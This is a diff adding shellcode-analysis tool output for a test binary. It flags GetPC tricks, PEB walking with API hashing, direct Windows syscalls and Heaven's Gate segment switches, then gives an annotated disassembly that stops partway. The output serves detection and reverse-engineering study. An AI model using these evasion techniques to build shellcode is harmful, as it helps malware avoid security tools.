@@ -1,0 +1,1129 @@
+Filename: heavenbin.bin
+File Type: rawHex
+Architecture: 32-bit
+Date Analyzed: 2022-01-18 12:34:04
+Seconds since last epoch: 1642530844.257372
+Shellcode Entry point: 0x0
+
+No strings found.
+
+
+***********
+Push ret
+***********
+
+********************************************************************************************************
+Push ret Item: 0 | Section: -1 | Section name: rawHex | PUSH Offset: 0x1f1, edx | RET Offset: 0x1f2
+0x1f1      push edx 
+0x1f2      ret   
+********************************************************************************************************
+Push ret Item: 1 | Section: -1 | Section name: rawHex | PUSH Offset: 0x1ae, edx | RET Offset: 0x1af
+0x1ae      push edx 
+0x1af      ret   
+********************************************************************************************************
+Push ret Item: 2 | Section: -1 | Section name: rawHex | PUSH Offset: 0x1a4, edx | RET Offset: 0x1a5
+0x1a4      push edx 
+0x1a5      ret   
+********************************************************************************************************
+Push ret Item: 3 | Section: -1 | Section name: rawHex | PUSH Offset: 0x1b0, ebx | RET Offset: 0x1b1
+0x1b0      push ebx 
+0x1b1      ret   
+********************************************************************************************************
+Push ret Item: 4 | Section: -1 | Section name: rawHex | PUSH Offset: 0x1e7, ebx | RET Offset: 0x1e8
+0x1e7      push ebx 
+0x1e8      ret   
+********************************************************************************************************
+Push ret Item: 5 | Section: -1 | Section name: rawHex | PUSH Offset: 0x241, ebx | RET Offset: 0x242
+0x241      push ebx 
+0x242      ret   
+
+
+***********
+Fstenv
+***********
+
+********************************************************************************************************
+Fstenv Item: 0 | Section: -1 | Section name: rawHex | FPU Offset: 0x109 | FSTENV Offset: 0x114
+0x109      fldpi  
+0x10b      mov  eax, 0x42 
+0x110      add  eax, 0x20 
+0x113      wait  
+0x114      fnstenv [eax] 
+********************************************************************************************************
+Fstenv Item: 1 | Section: -1 | Section name: rawHex | FPU Offset: 0xcd | FSTENV Offset: 0xd4
+0xcd       fsqrt  
+0xcf       nop   
+0xd0       nop   
+0xd1       nop   
+0xd2       nop   
+0xd3       wait  
+0xd4       fnstenv [esp + 4] 
+********************************************************************************************************
+Fstenv Item: 2 | Section: -1 | Section name: rawHex | FPU Offset: 0x86 | FSTENV Offset: 0x8a
+0x86       fsqrt  
+0x88       nop   
+0x89       nop   
+0x8a       fnstenv [esp + 4] 
+
+
+***********
+Call Pop
+***********
+
+********************************************************************************************************
+Call pop Item: 0 | Section: -1 | Section name: rawHex
+0x1ca      call 0x1cf 
+0x1cf      pop  eax 
+********************************************************************************************************
+Call pop Item: 1 | Section: -1 | Section name: rawHex
+0x3c       call 0x41 
+0x41       pop  edx 
+********************************************************************************************************
+Call pop Item: 2 | Section: -1 | Section name: rawHex
+0x22f      call 0x23f 
+0x234      add  eax, 3 
+0x237      push 0x33 
+0x239      push 0x401000 
+0x23e      retf  
+0x23f      pop  ebx 
+
+
+***************
+Windows syscall
+***************
+
+********************************************************************************************************
+Syscall Item: 0 | Section name: rawHex | EAX: 0x26 | 0xc0 offset: 0x155
+jmp    0x12d                          0x142   
+cmp    edx, ebx                       0x144   
+mov    eax, dword ptr [edi + 0x10]    0x146   
+mov    edi, dword ptr [edi]           0x149   
+xor    ebx, ebx                       0x14b   
+xor    ebx, eax                       0x14d   
+push   0x26                           0x14f   
+pop    eax                            0x151   
+xor    ecx, ecx                       0x152   
+push   ebx                            0x154   
+call   dword ptr fs:[0xc0]            0x155   
+
+OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm
+OS: Windows 10 (20H2) Syscall: NtOpenProcess
+********************************************************************************************************
+Syscall Item: 1 | Section name: rawHex | EAX: 0x26 | 0xc0 offset: 0x162
+xor    ebx, ebx                       0x14b   
+xor    ebx, eax                       0x14d   
+push   0x26                           0x14f   
+pop    eax                            0x151   
+xor    ecx, ecx                       0x152   
+push   ebx                            0x154   
+call   dword ptr fs:[0xc0]            0x155   
+mov    ecx, eax                       0x15c   
+sub    ecx, 0xb                       0x15e   
+push   ecx                            0x161   
+call   dword ptr fs:[0xc0]            0x162   
+
+OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm
+OS: Windows 10 (20H2) Syscall: NtOpenProcess
+********************************************************************************************************
+Syscall Item: 2 | Section name: rawHex | EAX: 0x26 | 0xc0 offset: 0x183
+ret                                   0x16b   
+mov    edx, ebp                       0x16c   
+add    edx, dword ptr [edx + 0x3c]    0x16e   
+mov    edx, dword ptr [edx + 0x78]    0x171   
+add    edx, ebp                       0x174   
+mov    ebx, dword ptr [edx + 0x20]    0x176   
+push   0x13                           0x179   
+pop    ecx                            0x17b   
+mov    eax, 0x13                      0x17c   
+add    eax, ecx                       0x181   
+call   dword ptr fs:[0xc0]            0x183   
+
+OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm
+OS: Windows 10 (20H2) Syscall: NtOpenProcess
+********************************************************************************************************
+Syscall Item: 3 | Section name: rawHex | EAX: 0x3a | 0xc0 offset: 0x21d
+movzx  eax, word ptr [eax]            0x204   
+push   0x26                           0x207   
+pop    eax                            0x209   
+add    eax, 0x14                      0x20a   
+xor    ebx, ebx                       0x20d   
+add    ebx, eax                       0x20f   
+mov    edx, ebx                       0x211   
+sub    edx, eax                       0x213   
+push   edx                            0x215   
+lcall  0x33:0x1337c0de                0x216   
+call   dword ptr fs:[0xc0]            0x21d   
+
+OS: Windows Server 2008 (SP0) Syscall: NtQueryAttributesFile
+OS: Windows 10 (20H2) Syscall: NtWriteVirtualMemory
+
+
+***************
+Walking the PEB
+***************
+
+********************************************************************************************************
+PEB Item: 0 | Points: 3 | Section: -1 | Section name: rawHex
+0x119      mov  edi, dword ptr fs:[0x30] 
+0x120      mov  edi, dword ptr [edi + 0xc] 
+0x123      jmp  0x12d 
+0x125      mov  edi, dword ptr [edi + 0x14] 
+0x128      mov  esi, dword ptr [edi + 0x28] 
+********************************************************************************************************
+PEB Item: 1 | Points: 4 | Section: -1 | Section name: rawHex
+0x1dc      mov  ebp, dword ptr fs:[eax + 0x30] 
+0x1e0      mov  edi, dword ptr [edi + 0xc] 
+0x1e3      mov  edi, dword ptr [edi + 0x14] 
+0x1e6      lodsd eax, dword ptr [esi] 
+0x1e7      push ebx 
+0x1e8      ret   
+
+
+***************
+Heaven's Gate
+***************
+
+********************************************************************************************************
+Heaven Item: 0 | Section: -1 | Section name: rawHex | PushOffset: 0x1a6 | Heaven's Gate offset: 0x1ad
+push edx     0x1a4 (offset 0x1a4)
+ret      0x1a5 (offset 0x1a5)
+push 0x33     0x1a6 (offset 0x1a6)
+push 0xdeafbeef     0x1a8 (offset 0x1a8)
+retf      0x1ad (offset 0x1ad)
+********************************************************************************************************
+Heaven Item: 1 | Section: -1 | Section name: rawHex | PushOffset: -0x1 | Heaven's Gate offset: 0x1b2
+ljmp 0x33:0x12345678     0x1b2 (offset 0x1b2)
+********************************************************************************************************
+Heaven Item: 2 | Section: -1 | Section name: rawHex | PushOffset: -0x1 | Heaven's Gate offset: 0x1d0
+lcall 0x33:0x12310000     0x1d0 (offset 0x1d0)
+********************************************************************************************************
+Heaven Item: 3 | Section: -1 | Section name: rawHex | PushOffset: 0x1e9 | Heaven's Gate offset: 0x1f0
+push ebx     0x1e7 (offset 0x1e7)
+ret      0x1e8 (offset 0x1e8)
+push 0x33     0x1e9 (offset 0x1e9)
+push 0x11111111     0x1eb (offset 0x1eb)
+retf      0x1f0 (offset 0x1f0)
+********************************************************************************************************
+Heaven Item: 4 | Section: -1 | Section name: rawHex | PushOffset: -0x1 | Heaven's Gate offset: 0x1f3
+ljmp 0x33:0xdeadbeef     0x1f3 (offset 0x1f3)
+********************************************************************************************************
+Heaven Item: 5 | Section: -1 | Section name: rawHex | PushOffset: -0x1 | Heaven's Gate offset: 0x216
+lcall 0x33:0x1337c0de     0x216 (offset 0x216)
+********************************************************************************************************
+Heaven Item: 6 | Section: -1 | Section name: rawHex | PushOffset: 0x237 | Heaven's Gate offset: 0x23e
+call 0x23f     0x22f (offset 0x22f)
+add eax, 3     0x234 (offset 0x234)
+push 0x33     0x237 (offset 0x237)
+push 0x401000     0x239 (offset 0x239)
+retf      0x23e (offset 0x23e)
+
+
+****************
+Disassembly
+****************
+
+
+[32;1m0x0[0m [37mdec esp                                  [31;1m4c [0m                   [36;1m L[0m
+[35;1m    [35;1m ; ***Shellcode Entry Point, offset 0x0***[0m                                            
+[32;1m0x1[0m [37madd dword ptr [ecx], eax                 [31;1m01 01 [0m                [36;1m ..[0m
+[32;1m0x3[0m [37madd byte ptr [eax - 0x7d9fb826], bh      [31;1m00 b8 da 47 60 82 [0m    [36;1m ...G`.[0m
+[32;1m0x9[0m [37madd eax, dword ptr [eax]                 [31;1m03 00 [0m                [36;1m ..[0m
+[32;1m0xb[0m [37madd byte ptr [ecx], ah                   [31;1m00 21 [0m                [36;1m .![0m
+[32;1m0xd[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0xf[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x11[0m [37malign 0x3                                [31;1m00 00 00 2e ...[0m       [36;1m .......[0m
+[32;1m0x14[0m [37mdb 0x2e                                  [31;1m2e [0m                   [36;1m .[0m
+[32;1m0x15[0m [37mdb 0x74                                  [31;1m74 [0m                   [36;1m t[0m
+[32;1m0x16[0m [37mdb 0x65                                  [31;1m65 [0m                   [36;1m e[0m
+[32;1m0x17[0m [37mdb 0x78                                  [31;1m78 [0m                   [36;1m x[0m
+[32;1m0x18[0m [37mdb 0x74                                  [31;1m74 [0m                   [36;1m t[0m
+[32;1m0x19[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x1a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x1b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x1c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x1d[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x1d[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x24[0m [37mles eax, ptr [edx]                       [31;1mc4 02 [0m                [36;1m ..[0m
+[32;1m0x26[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x28[0m [37mcmp al, 0                                [31;1m3c 00 [0m                [36;1m <.[0m
+[32;1m0x2a[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x2c[0m [37madd byte ptr [ebx], al                   [31;1m00 03 [0m                [36;1m ..[0m
+[32;1m0x2e[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x30[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x32[0m [37malign 0x2                                [31;1m00 00 0d 00 ...[0m       [36;1m .......[0m
+[32;1m0x34[0m [37mor eax, 0x20000000                       [31;1m0d 00 00 00 20 [0m       [36;1m .... [0m
+[32;1m0x39[0m [37madd byte ptr [eax + 0x60], dl            [31;1m00 50 60 [0m             [36;1m .P`[0m
+[32;1m0x3c[0m [37mcall 0x41                                [31;1me8 00 00 00 00 [0m       [36;1m .....[0m
+[33;1m	 label_0x41:
+[0m[32;1m0x41[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[32;1m0x42[0m [37mlea edx, [edx - 5]                       [31;1m8d 52 fb [0m             [36;1m .R.[0m
+[32;1m0x45[0m [37mmov ebp, esp                             [31;1m89 e5 [0m                [36;1m ..[0m
+[32;1m0x47[0m [37msub esp, 0x1000                          [31;1m81 ec 00 10 00 00 [0m    [36;1m ......[0m
+[32;1m0x4d[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x4e[0m [37mmov ebx, 0x4b1ffe8e                      [31;1mbb 8e fe 1f 4b [0m       [36;1m ....K[0m
+[32;1m0x53[0m [37mcall 0x116                               [31;1me8 be 00 00 00 [0m       [36;1m .....[0m
+[32;1m0x58[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0x59[0m [37mpush ebp                                 [31;1m55 [0m                   [36;1m U[0m
+[32;1m0x5a[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x5b[0m [37mmov ebp, eax                             [31;1m89 c5 [0m                [36;1m ..[0m
+[32;1m0x5d[0m [37mlea esi, [edx + 0x24f]                   [31;1m8d b2 4f 02 00 00 [0m    [36;1m ..O...[0m
+[32;1m0x63[0m [37mlea edi, [edx + 0x25b]                   [31;1m8d ba 5b 02 00 00 [0m    [36;1m ..[...[0m
+[32;1m0x69[0m [37mcall 0x16c                               [31;1me8 fe 00 00 00 [0m       [36;1m .....[0m
+[32;1m0x6e[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0x6f[0m [37mpop ebp                                  [31;1m5d [0m                   [36;1m ][0m
+[32;1m0x70[0m [37mpush ebp                                 [31;1m55 [0m                   [36;1m U[0m
+[32;1m0x71[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x72[0m [37mlea esi, [edx + 0x219]                   [31;1m8d b2 19 02 00 00 [0m    [36;1m ......[0m
+[32;1m0x78[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0x79[0m [37mpush dword ptr [edx + 0x25f]             [31;1mff b2 5f 02 00 00 [0m    [36;1m .._...[0m
+[32;1m0x7f[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[32;1m0x80[0m [37mcall eax                                 [31;1mff d0 [0m                [36;1m ..[0m
+[32;1m0x82[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0x83[0m [37mpop ebp                                  [31;1m5d [0m                   [36;1m ][0m
+[32;1m0x84[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0x85[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0x86[0m [37mfsqrt                                    [31;1md9 fa [0m                [36;1m ..[0m
+[35;1m    [35;1m ; floating point to set up GetPC[0m                                             
+[32;1m0x88[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0x89[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0x8a[0m [37mfnstenv [esp + 4]                        [31;1md9 74 24 04 [0m          [36;1m .t$.[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[32;1m0x8e[0m [37mpush ebp                                 [31;1m55 [0m                   [36;1m U[0m
+[32;1m0x8f[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x90[0m [37mmov ebp, eax                             [31;1m89 c5 [0m                [36;1m ..[0m
+[32;1m0x92[0m [37mlea esi, [edx + 0x263]                   [31;1m8d b2 63 02 00 00 [0m    [36;1m ..c...[0m
+[32;1m0x98[0m [37mlea edi, [edx + 0x26b]                   [31;1m8d ba 6b 02 00 00 [0m    [36;1m ..k...[0m
+[32;1m0x9e[0m [37mcall 0x16c                               [31;1me8 c9 00 00 00 [0m       [36;1m .....[0m
+[32;1m0xa3[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0xa4[0m [37mpop ebp                                  [31;1m5d [0m                   [36;1m ][0m
+[32;1m0xa5[0m [37mwait                                     [31;1m9b [0m                   [36;1m .[0m
+[32;1m0xa6[0m [37mfnstenv [ecx + 0xc]                      [31;1md9 71 0c [0m             [36;1m .q.[0m
+[32;1m0xa9[0m [37mfnstenv [ebp + 7]                        [31;1md9 75 07 [0m             [36;1m .u.[0m
+[32;1m0xac[0m [37mpush ebp                                 [31;1m55 [0m                   [36;1m U[0m
+[32;1m0xad[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0xae[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xb0[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xb2[0m [37mlea esi, [edx + 0x224]                   [31;1m8d b2 24 02 00 00 [0m    [36;1m ..$...[0m
+[32;1m0xb8[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0xb9[0m [37mlea esi, [edx + 0x230]                   [31;1m8d b2 30 02 00 00 [0m    [36;1m ..0...[0m
+[32;1m0xbf[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0xc0[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xc2[0m [37mpush dword ptr [edx + 0x26b]             [31;1mff b2 6b 02 00 00 [0m    [36;1m ..k...[0m
+[32;1m0xc8[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[32;1m0xc9[0m [37mcall eax                                 [31;1mff d0 [0m                [36;1m ..[0m
+[32;1m0xcb[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0xcc[0m [37mpop ebp                                  [31;1m5d [0m                   [36;1m ][0m
+[32;1m0xcd[0m [37mfsqrt                                    [31;1md9 fa [0m                [36;1m ..[0m
+[35;1m    [35;1m ; floating point to set up GetPC[0m                                             
+[32;1m0xcf[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0xd0[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0xd1[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0xd2[0m [37mnop                                      [31;1m90 [0m                   [36;1m .[0m
+[32;1m0xd3[0m [37mwait                                     [31;1m9b [0m                   [36;1m .[0m
+[32;1m0xd4[0m [37mfnstenv [esp + 4]                        [31;1md9 74 24 04 [0m          [36;1m .t$.[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[32;1m0xd8[0m [37mpush ebp                                 [31;1m55 [0m                   [36;1m U[0m
+[32;1m0xd9[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0xda[0m [37mlea esi, [edx + 0x26f]                   [31;1m8d b2 6f 02 00 00 [0m    [36;1m ..o...[0m
+[32;1m0xe0[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0xe1[0m [37mlea esi, [edx + 0x27f]                   [31;1m8d b2 7f 02 00 00 [0m    [36;1m ......[0m
+[32;1m0xe7[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0xe8[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xea[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xec[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xee[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xf0[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xf2[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xf4[0m [37mlea esi, [edx + 0x224]                   [31;1m8d b2 24 02 00 00 [0m    [36;1m ..$...[0m
+[32;1m0xfa[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0xfb[0m [37mpush 0                                   [31;1m6a 00 [0m                [36;1m j.[0m
+[32;1m0xfd[0m [37mpush dword ptr [edx + 0x25b]             [31;1mff b2 5b 02 00 00 [0m    [36;1m ..[...[0m
+[32;1m0x103[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[32;1m0x104[0m [37mcall eax                                 [31;1mff d0 [0m                [36;1m ..[0m
+[32;1m0x106[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0x107[0m [37mpop ebp                                  [31;1m5d [0m                   [36;1m ][0m
+[32;1m0x108[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+
+[32;1m0x109[0m [37mfldpi                                    [31;1md9 eb [0m                [36;1m ..[0m
+[35;1m    [35;1m ; floating point to set up GetPC[0m                                             
+[32;1m0x10b[0m [37mmov eax, 0x42                            [31;1mb8 42 00 00 00 [0m       [36;1m .B...[0m
+[32;1m0x110[0m [37madd eax, 0x20                            [31;1m83 c0 20 [0m             [36;1m .. [0m
+[32;1m0x113[0m [37mwait                                     [31;1m9b [0m                   [36;1m .[0m
+[32;1m0x114[0m [37mfnstenv [eax]                            [31;1md9 30 [0m                [36;1m .0[0m
+[35;1m    [35;1m ; GetPC[0m                                                                      
+[33;1m	 label_0x116:
+[0m[32;1m0x116[0m [37mcld                                      [31;1mfc [0m                   [36;1m .[0m
+[32;1m0x117[0m [37mxor edi, edi                             [31;1m31 ff [0m                [36;1m 1.[0m
+[32;1m0x119[0m [37mmov edi, dword ptr fs:[0x30]             [31;1m64 8b 3d 30 00 00 00 [0m [36;1m d.=0...[0m
+[35;1m    [35;1m; load TIB[0m                                                                    
+[32;1m0x120[0m [37mmov edi, dword ptr [edi + 0xc]           [31;1m8b 7f 0c [0m             [36;1m ...[0m
+[35;1m    [35;1m; load PEB_LDR_DATA LoaderData[0m                                                
+[32;1m0x123[0m [37mjmp 0x12d                                [31;1meb 08 [0m                [36;1m ..[0m
+
+[32;1m0x125[0m [37mmov edi, dword ptr [edi + 0x14]          [31;1m8b 7f 14 [0m             [36;1m ...[0m
+[35;1m    [35;1m; LIST_ENTRY InMemoryOrderModuleList[0m                                            
+[33;1m	 label_0x128:
+[0m[32;1m0x128[0m [37mmov esi, dword ptr [edi + 0x28]          [31;1m8b 77 28 [0m             [36;1m .w([0m
+[32;1m0x12b[0m [37mxor edx, edx                             [31;1m31 d2 [0m                [36;1m 1.[0m
+[33;1m	 label_0x12d:
+[0m[32;1m0x12d[0m [37mlodsw ax, word ptr [esi]                 [31;1m66 ad [0m                [36;1m f.[0m
+[32;1m0x12f[0m [37mtest al, al                              [31;1m84 c0 [0m                [36;1m ..[0m
+[32;1m0x131[0m [37mje 0x144                                 [31;1m74 11 [0m                [36;1m t.[0m
+
+[32;1m0x133[0m [37mcmp al, 0x41                             [31;1m3c 41 [0m                [36;1m <A[0m
+[32;1m0x135[0m [37mjb 0x13d                                 [31;1m72 06 [0m                [36;1m r.[0m
+
+[32;1m0x137[0m [37mcmp al, 0x5a                             [31;1m3c 5a [0m                [36;1m <Z[0m
+[32;1m0x139[0m [37mja 0x13d                                 [31;1m77 02 [0m                [36;1m w.[0m
+
+[32;1m0x13b[0m [37mor al, 0x20                              [31;1m0c 20 [0m                [36;1m . [0m
+[33;1m	 label_0x13d:
+[0m[32;1m0x13d[0m [37mrol edx, 7                               [31;1mc1 c2 07 [0m             [36;1m ...[0m
+[32;1m0x140[0m [37mxor dl, al                               [31;1m30 c2 [0m                [36;1m 0.[0m
+[32;1m0x142[0m [37mjmp 0x12d                                [31;1meb e9 [0m                [36;1m ..[0m
+
+[33;1m	 label_0x144:
+[0m[32;1m0x144[0m [37mcmp edx, ebx                             [31;1m39 da [0m                [36;1m 9.[0m
+[32;1m0x146[0m [37mmov eax, dword ptr [edi + 0x10]          [31;1m8b 47 10 [0m             [36;1m .G.[0m
+[32;1m0x149[0m [37mmov edi, dword ptr [edi]                 [31;1m8b 3f [0m                [36;1m .?[0m
+[32;1m0x14b[0m [37mxor ebx, ebx                             [31;1m31 db [0m                [36;1m 1.[0m
+[32;1m0x14d[0m [37mxor ebx, eax                             [31;1m31 c3 [0m                [36;1m 1.[0m
+[32;1m0x14f[0m [37mpush 0x26                                [31;1m6a 26 [0m                [36;1m j&[0m
+[32;1m0x151[0m [37mpop eax                                  [31;1m58 [0m                   [36;1m X[0m
+[32;1m0x152[0m [37mxor ecx, ecx                             [31;1m31 c9 [0m                [36;1m 1.[0m
+[32;1m0x154[0m [37mpush ebx                                 [31;1m53 [0m                   [36;1m S[0m
+[32;1m0x155[0m [37mcall dword ptr fs:[0xc0]                 [31;1m64 ff 15 c0 00 00 00 [0m [36;1m d......[0m
+[35;1m    [35;1m ; Calling Windows syscall - value: 0x26[0m                                            
+[32;1m0x15c[0m [37mmov ecx, eax                             [31;1m89 c1 [0m                [36;1m ..[0m
+[32;1m0x15e[0m [37msub ecx, 0xb                             [31;1m83 e9 0b [0m             [36;1m ...[0m
+[32;1m0x161[0m [37mpush ecx                                 [31;1m51 [0m                   [36;1m Q[0m
+[32;1m0x162[0m [37mcall dword ptr fs:[0xc0]                 [31;1m64 ff 15 c0 00 00 00 [0m [36;1m d......[0m
+[35;1m    [35;1m ; Calling Windows syscall - value: 0x26[0m                                            
+[32;1m0x169[0m [37mjne 0x128                                [31;1m75 bd [0m                [36;1m u.[0m
+
+[32;1m0x16b[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+
+[33;1m	 label_0x16c:
+[0m[32;1m0x16c[0m [37mmov edx, ebp                             [31;1m89 ea [0m                [36;1m ..[0m
+[32;1m0x16e[0m [37madd edx, dword ptr [edx + 0x3c]          [31;1m03 52 3c [0m             [36;1m .R<[0m
+[32;1m0x171[0m [37mmov edx, dword ptr [edx + 0x78]          [31;1m8b 52 78 [0m             [36;1m .Rx[0m
+[32;1m0x174[0m [37madd edx, ebp                             [31;1m01 ea [0m                [36;1m ..[0m
+[32;1m0x176[0m [37mmov ebx, dword ptr [edx + 0x20]          [31;1m8b 5a 20 [0m             [36;1m .Z [0m
+[32;1m0x179[0m [37mpush 0x13                                [31;1m6a 13 [0m                [36;1m j.[0m
+[32;1m0x17b[0m [37mpop ecx                                  [31;1m59 [0m                   [36;1m Y[0m
+[32;1m0x17c[0m [37mmov eax, 0x13                            [31;1mb8 13 00 00 00 [0m       [36;1m .....[0m
+[32;1m0x181[0m [37madd eax, ecx                             [31;1m01 c8 [0m                [36;1m ..[0m
+[32;1m0x183[0m [37mcall dword ptr fs:[0xc0]                 [31;1m64 ff 15 c0 00 00 00 [0m [36;1m d......[0m
+[35;1m    [35;1m ; Calling Windows syscall - value: 0x26[0m                                            
+[32;1m0x18a[0m [37madd ebx, ebp                             [31;1m01 eb [0m                [36;1m ..[0m
+[32;1m0x18c[0m [37mxor ecx, ecx                             [31;1m31 c9 [0m                [36;1m 1.[0m
+[33;1m	 label_0x18e:
+[0m[32;1m0x18e[0m [37mpush edi                                 [31;1m57 [0m                   [36;1m W[0m
+[32;1m0x18f[0m [37mpush esi                                 [31;1m56 [0m                   [36;1m V[0m
+[32;1m0x190[0m [37mmov esi, dword ptr [esi]                 [31;1m8b 36 [0m                [36;1m .6[0m
+[33;1m	 label_0x192:
+[0m[32;1m0x192[0m [37mmov edi, dword ptr [ebx]                 [31;1m8b 3b [0m                [36;1m .;[0m
+[32;1m0x194[0m [37madd edi, ebp                             [31;1m01 ef [0m                [36;1m ..[0m
+[32;1m0x196[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[32;1m0x197[0m [37mxor edx, edx                             [31;1m31 d2 [0m                [36;1m 1.[0m
+[33;1m	 label_0x199:
+[0m[32;1m0x199[0m [37mrol edx, 7                               [31;1mc1 c2 07 [0m             [36;1m ...[0m
+[32;1m0x19c[0m [37mxor dl, byte ptr [edi]                   [31;1m32 17 [0m                [36;1m 2.[0m
+[32;1m0x19e[0m [37minc edi                                  [31;1m47 [0m                   [36;1m G[0m
+[32;1m0x19f[0m [37mcmp byte ptr [edi], 0                    [31;1m80 3f 00 [0m             [36;1m .?.[0m
+[32;1m0x1a2[0m [37mjne 0x199                                [31;1m75 f5 [0m                [36;1m u.[0m
+
+[32;1m0x1a4[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x1a5[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to edx[0m                                                            
+
+[32;1m0x1a6[0m [37mpush 0x33                                [31;1m6a 33 [0m                [36;1m j3[0m
+[35;1m    [35;1m ; Heaven's gate destination address: 0x33[0m                                            
+[32;1m0x1a8[0m [37mpush 0xdeafbeef                          [31;1m68 ef be af de [0m       [36;1m h....[0m
+[32;1m0x1ad[0m [37mretf                                     [31;1mcb [0m                   [36;1m .[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x1ae[0m [37mpush edx                                 [31;1m52 [0m                   [36;1m R[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x1af[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to edx[0m                                                            
+
+[32;1m0x1b0[0m [37mpush ebx                                 [31;1m53 [0m                   [36;1m S[0m
+[35;1m    [35;1m; pushing return address [0m                                                     
+[32;1m0x1b1[0m [37mret                                      [31;1mc3 [0m                   [36;1m .[0m
+[35;1m    [35;1m; returning to ebx[0m                                                            
+
+[32;1m0x1b2[0m [37mljmp 0x33:0x12345678                     [31;1mea 78 56 34 12 33 00 [0m [36;1m .xV4.3.[0m
+[35;1m    [35;1m ; invoking Heaven's Gate technique[0m                                            
+[32;1m0x1b9[0m [37mxchg eax, edx                            [31;1m92 [0m                   [36;1m .[0m
+[32;1m0x1ba[0m [37mpop edx                                  [31;1m5a [0m                   [36;1m Z[0m
+[32;1m0x1bb[0m [37mcmp eax, esi                             [31;1m39 f0 [0m                [36;1m 9.[0m
+[32;1m0x1bd[0m [37mje 0x1d8                                 [31;1m74 19 [0m                [36;1m t.[0m
+
+[32;1m0x1bf[0m [37madd ebx, 4                               [31;1m83 c3 04 [0m             [36;1m ...[0m
+[32;1m0x1c2[0m [37minc ecx                                  [31;1m41 [0m                   [36;1m A[0m
